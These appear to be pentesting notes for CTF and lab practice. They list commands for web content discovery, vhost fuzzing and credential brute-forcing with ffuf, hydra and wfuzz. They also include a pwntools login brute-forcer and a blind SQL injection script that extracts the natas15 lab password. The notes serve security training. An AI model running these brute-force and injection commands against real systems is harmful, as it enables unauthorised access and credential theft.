# Fuzzing / Bruteforcing

## General

{% code overflow="wrap" fullWidth="true" %}
```bash
amap $IP $PORT # to find http(s), other services

dirsearch.py -u $URL[:$PORT] -E -x 400,500 -r -t 50 -w $WORDLIST
# -E include common extensions
# -x exclude status codes
# -r recursive
# -t number of threads
```
{% endcode %}

## ffuf

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/ffuf/ffuf/wiki
ffuf -c -r -u http://$IP/FUZZ -w $DICT -t 500 -e .php,.txt
ffuf -u http://10.10.81.11/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -fs 0
# REMEMBER, FFUF DON'T CHECK ALL STATUS CODES BY DEFAULT, TO DO IT
-mc all
# AND HAVING SEEN ALL, TO FILTER OUT ONE LIKE 400 FOR EXAMPLE
-mc all -fc 400
-ac # Auto-filter based on generic response.

# VHOST
ffuf -r -u http://$IP -c -w /usr/share/custom-wordlists/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.analytical.htb' -t 200 -mc all -ac

# MULTIPLE REQUESTS AND ELABORATED BODIES
ffuf -c -request req.txt -request-proto http -w rockyou.txt:HFUZZ

# MATCH REGEX TO INCLUDE JUST RESPONSES WITH SPECIFIC TEXT
-mr 'banned char'

# TO CHECK A SPECIFIC FILE WITH EXTENSIONS
ffuf -u http://10.10.229.83/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
# SKIP STARTING WITH DOT
ffuf -u http://10.10.229.83/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fr '/\..*'
# FINDING PARAMETERS
ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt 
ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
# FUZZING VALUES
seq 0 255 | ffuf -u 'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ' -c -w -
# RECURSION (FOLLOW THIS ORDER REGARDING FFUF COMMAND PARAMETERS)
ffuf -recursion ...
# USERNAMES AND PASSWORDS
ffuf -u http://10.10.81.11/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded'
# SUBDOMAIN AND VHOST ENUMERATION
ffuf -u http://FUZZ.google.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
ffuf -u http://google.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.google.com' -fs 0
# Then we add the host to /etc/hosts and try --resolve with curl

# PROXIES
#Whether it' for network pivoting or for using BurpSuite plugins you can send all the ffuf traffic through a web proxy (HTTP or SOCKS5).
ffuf -u http://10.10.81.11/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080
#It's also possible to send only matches to your proxy for replaying:
ffuf -u http://FUZZ.tryhackme.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -replay-proxy http://127.0.0.1:8080
# useful if you don't need all the traffic to traverse an upstream proxy and want to minimize resource usage or to avoid polluting your proxy history.

# BRUTE FORCE CREDENTIALS
# In the request file, username=HFUZZ&password=WFUZZ
ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ
```
{% endcode %}

## Hydra

{% hint style="info" %}
Pay attention to HTTP(S), GET/POST, CSRF token, Cookies... try for example with CSRF token but w/o cookies and so on.
{% endhint %}

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">https://github.com/gnebbia/hydra_notes

<strong># VERY IMPORTAAAAANT
</strong>#----------------
# WITH ROCKYOU DICTIONARY, USE -t 32/48/64 to increase the speed (it might help to reduce cracking time)
# WAIT FOR THE RESULTS AT LEAST 30-40-50 MIN FOR SOME CTF BOXES
-e nsr   # try "n" null password, "s" login as pass and/or "r" reversed login

hydra -l bob -F -P /usr/share/wordlists/rockyou.txt 10.11.1.X -s 8080 http-post-form "/php/index.php:tg=login&#x26;referer=index.php&#x26;login=login&#x26;sAuthType=Ovidentia&#x26;nickname=^USER^&#x26;password=^PASS^&#x26;submit=Login:F=Failed:H=Cookie\: OV3176019645=a4u215fgf3tj8718i0b1rj7ia5"

hydra -l $username -P $dict -s $port $ip_address $request_method $path
hydra -l admin -P rockyou -s 8090 -f 192.168.1.4 http-get /get_camera_params.cgi

# ANOTHER OPTION IS http-get-form, same as http-post-form
# USE BURP TO INTERCEPT REQUEST AND SEE PARAMS FOR HYDRA
'/login.php:user=^USER^&#x26;pass=^PASS^' for example
http-post-form /f/login.php:username=^USER^&#x26;password=^PASS^&#x26;Login=Login:Login Failed

<strong># WITH ONLY ONE PARAM (NO LOGIN)
</strong>-l '' -P $WORDLIST “/index.php:key=^PASS^:Log in"

# HYDRA POST LOGIN
hydra -L $LOGIN -P $PASSWORD -f $IP http(s)-post-form 
"/wp-login.php:log=^USER^&#x26;pwd=^PASS^&#x26;wp-submit=...&#x26;testcookie=1:F=Invalid username"

hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
# -f                      Exit after the first guess
# -vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
# ftp / smb / protocol          Sets the protocol
</code></pre>

### Basic Auth

![hydra -L users -P pass -f 10.10.10.6 http-get /development](<../../.gitbook/assets/image (93).png>)

### API w/ JSON format

Maybe the API is actually designed to either accept Form data, or JSON data. The front-end sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:

{% tabs %}
{% tab title="Request Body - JSON" %}
```
{"username":"admin","password":"admin"}
```
{% endtab %}

{% tab title="Request Path" %}
```
/api/user/login
```
{% endtab %}

{% tab title="Error message for incorrect logins" %}
```
"Invalid Username Or Password"
```
{% endtab %}
{% endtabs %}

The command for this is (replace the parts with angle brackets, you will need to escape special characters):

{% code overflow="wrap" %}
```sh
hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
```
{% endcode %}

{% hint style="info" %}
If you're struggling with JSON, the API route also accepts form data, which is easier to use with Hydra.
{% endhint %}

## VHOST

{% code overflow="wrap" fullWidth="true" %}
```bash
# VHOST, if it is abc.def.com, add it + def.com to hosts and try fuzzing --- USE BIGGER WORDLISTS IF NEEDED
gobuster vhost -u http://def.com -w subdomains-top1million-110000.txt (--append-domain) -t 150
ffuf -u http://domain.com -c -w namelist.txt -H 'Host: FUZZ.google.com' -t 150
# Always try different DNS wordlists, even big ones such as directory-list-medium or dns-Jhadix
```
{% endcode %}

## Proxychains

```bash
# With dynamic port forwarding on port 1080
ffuf -c -r -u '$URL/FUZZ' -w common.txt -ic -x socks5://127.0.0.1:1080
# Burp if configured on localhost:8080
ffuf -c -r -u '$URL/FUZZ' -w common.txt -ic -x http://127.0.0.1:8080
```

## Wordlists

[https://github.com/six2dez/OneListForAll](https://github.com/six2dez/OneListForAll)

## Nikto

```sh
nikto -url http://$IP:$PORT/$PATH
```

## gospider

{% code overflow="wrap" fullWidth="true" %}
```sh
gospider -s http://website.com --js -t 20 -d 2 --sitemap --robots -w -r > urls.txt
gospider -s http://$IP --js -t 20 -d 3 --sitemap --robots -w -r
gospider -s http://$IP/$PATH --js -t 20 -d 3 --sitemap --robots -w -r | grep -oP '/[a-z].*' | sort -u
```
{% endcode %}

## User/Pass Bruteforce Script

```python
#!/usr/bin/env python3

from pwn import *
import sys

host, port = 'BOX_IP', 31337

# https://raw.githubusercontent.com/shipcod3/Piata-Common-Usernames-and-Passwords/master/userpass.txt

with open('userpass.txt') as f:
    data = f.readlines()

for creds in data:
    (username, password) = creds.split(' ')
    username = username.strip()
    password = password.strip()

    s = remote(host, port, level='error')
    
    s.recvuntil('username> ')
    s.sendline(username)
    s.recvuntil('password> ')
    s.sendline(password)

    msg = s.recvline()
    if b'authentication failed' not in msg:
        print("[+] Valid credentials found: {}:{}".format(username, password))
        sys.exit(0)

    s.close()
```

## API Fuzzer

[https://github.com/Fuzzapi/API-fuzzer](https://github.com/Fuzzapi/API-fuzzer)

## wfuzz

```bash
wfuzz -c -L -t 400 --hc=404 -w dic.txt -w extensions.txt http://$IP/FUZZ.FUZ2Z
# -w $DICT --> dictionary with typical system files (/etc/passwd and so on)
# -H $AUTH
# --hw --> hide some responses that are useless or not found
# -L --> follow redirection, show the final status code and the response length
# FUZ2Z is for the second dict (extensions.txt)
# If there are more dicts, use FUZ3Z and so on
# -H "User agent: Google Chrome" (also for Authorization if authenticated)(por ejemplo, también con Authorization si estamos
#autenticados)

# BRUTE FORCE PASSWORD KNOWING USERNAME
wfuzz -c -t 500 --hc=404 -w $WORDLIST -d 'username=single&password=FUZZ' $URL
# -c coloured format
# -t 500 to use 500 threads and make it faster
# --hc hide status code to not show that one
# -d the data (request with a FUZZ parameter to guess) 
```

## gobuster

```
gobuster ... -x txt,pdf,config
```

## Extract password with binary search

{% code overflow="wrap" fullWidth="true" %}
```python
#!/usr/bin/python3

import requests, sys   # make HTTP requests and use sys to print 
from string import digits, ascii_lowercase, ascii_uppercase # to create the charset later

url = "http://natas15.natas.labs.overthewire.org/"

charset = ascii_lowercase + ascii_uppercase + digits

sqli = 'natas16" AND password LIKE BINARY "'

# Authentication for the website
s = requests.Session() 
s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ""

while len(password) < 32: # just suppose the password has max 32 characters
        for char in charset: # loop all the characters

                r = s.post(url, data={'username': sqli + password + char + "%"}) # parameter inspecting Network is user and we build AND password LIKE BYNARY "a%" to check if the pass starts with a and so on

                if "This user exists" in r.text: # if we find this text in the response
                        sys.stdout.write(char)   # show in terminal the current char
                        sys.stdout.flush()       # clean the screen
                        password += char         # add char to the password
                        break

```
{% endcode %}

## httpx

{% embed url="https://github.com/projectdiscovery/httpx" %}

## uniscan

Web scanner, be careful in case it autoexploits the target.

{% embed url="https://www.kali.org/tools/uniscan/" %}
